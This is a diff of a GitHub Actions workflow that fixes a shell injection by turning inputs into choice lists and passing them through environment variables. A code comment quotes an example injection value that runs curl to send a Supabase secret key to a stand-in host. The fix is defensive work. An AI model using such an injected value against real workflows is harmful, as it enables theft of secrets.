@@ -34,14 +34,31 @@ name: deliver-inbox-cloud
 on:
   workflow_dispatch:
     inputs:
+      # CONSTRAINED, NOT FREE-FORM — defence in depth behind the env fix below.
+      # A `type: choice` is validated by GitHub against this list before the job
+      # starts, so the value reaching the runner can only ever be one of these
+      # literals and cannot carry shell metacharacters at all. This is the shape
+      # dispatch-agent-cloud.yml already uses for its own `agent` input, which is
+      # precisely why that sibling workflow is NOT vulnerable to the injection
+      # Strix found here: its one shell-interpolated input was already a choice.
       to:
         description: 'Which inboxes to drain'
         required: false
+        type: choice
         default: 'xc,xc2'
+        options:
+          - 'xc,xc2'
+          - 'xc'
+          - 'xc2'
       limit:
         description: 'Max rows to deliver this run'
         required: false
+        type: choice
         default: '1'
+        options:
+          - '1'
+          - '3'
+          - '5'
       dry_run:
         description: 'Select and print, deliver nothing'
         type: boolean
@@ -130,11 +147,29 @@ jobs:
           SUPABASE_SECRET_KEY: ${{ secrets.SUPABASE_SECRET_KEY }}
           SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
           DISPATCH_RUNNER: deliver-inbox-cloud
+          # THE INPUTS ARE PASSED AS ENV, NEVER INTERPOLATED INTO THE SCRIPT.
+          #
+          # They were `${{ inputs.to }}` inline in the run: block below, which is a
+          # GitHub Actions script injection (CWE-94) — GitHub substitutes the raw
+          # string into the shell BEFORE bash parses it, so a `to` of
+          #     xc"; curl evil.example -d "$SUPABASE_SECRET_KEY
+          # executes on the runner. Found by Strix on #812 and REPRODUCED before
+          # fixing: the old form printed the key, this form passes the same hostile
+          # string through as one inert literal argv entry.
+          #
+          # This step is exactly where that matters most — it holds the Supabase
+          # SERVICE-ROLE key, which has rolbypassrls=true and therefore ignores every
+          # RLS policy on the project, and TRUSTKEYS_ENV_MASTER points at a file
+          # holding XAI_API_KEY. A shell here is a shell with the keyring.
+          DISPATCH_TO: ${{ inputs.to }}
+          DISPATCH_LIMIT: ${{ inputs.limit }}
+          DISPATCH_DRY_RUN: ${{ inputs.dry_run }}
         run: |
           set +e
-          ARGS="--to ${{ inputs.to || 'xc,xc2' }} --limit ${{ inputs.limit || 1 }}"
-          if [ "${{ inputs.dry_run }}" = "true" ]; then ARGS="$ARGS --dry-run"; fi
-          node scripts/dispatch/deliver-inbox.mjs $ARGS
+          # Array + quoted expansions: metacharacters stay data, never syntax.
+          ARGS=(--to "${DISPATCH_TO:-xc,xc2}" --limit "${DISPATCH_LIMIT:-1}")
+          if [ "$DISPATCH_DRY_RUN" = "true" ]; then ARGS+=(--dry-run); fi
+          node scripts/dispatch/deliver-inbox.mjs "${ARGS[@]}"
           code=$?
           echo "deliver_exit=$code" >> "$GITHUB_OUTPUT"
           exit 0
